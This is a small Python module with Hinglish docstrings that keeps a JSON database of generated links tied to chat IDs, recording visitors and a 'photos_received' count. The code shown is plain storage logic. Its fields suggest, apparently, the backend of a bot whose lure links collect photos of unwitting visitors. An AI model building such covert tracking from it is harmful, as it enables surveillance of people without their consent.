import json
import os
import uuid
from datetime import datetime

DB_FILE = "links_db.json"

def load_db():
    """Database load karo"""
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {}

def save_db(data):
    """Database save karo"""
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=2)

def create_link(chat_id, image_url, custom_message=""):
    """Naya unique link banao"""
    db = load_db()
    link_id = str(uuid.uuid4())[:8]  # 8 character unique ID
    
    db[link_id] = {
        "chat_id": str(chat_id),
        "image_url": image_url,
        "custom_message": custom_message,
        "created_at": datetime.now().isoformat(),
        "visitors": [],
        "photos_received": 0,
        "is_active": True
    }
    
    save_db(db)
    return link_id

def get_link(link_id):
    """Link ki details lo"""
    db = load_db()
    return db.get(link_id, None)

def add_visitor(link_id, visitor_info):
    """Visitor record karo"""
    db = load_db()
    if link_id in db:
        db[link_id]["visitors"].append({
            "timestamp": datetime.now().isoformat(),
            "info": visitor_info
        })
        db[link_id]["photos_received"] += 1
        save_db(db)
        return True
    return False

def get_user_links(chat_id):
    """User ke saare links lo"""
    db = load_db()
    user_links = {}
    for link_id, data in db.items():
        if data["chat_id"] == str(chat_id):
            user_links[link_id] = data
    return user_links

def deactivate_link(link_id):
    """Link ko band karo"""
    db = load_db()
    if link_id in db:
        db[link_id]["is_active"] = False
        save_db(db)
        return True
    return False
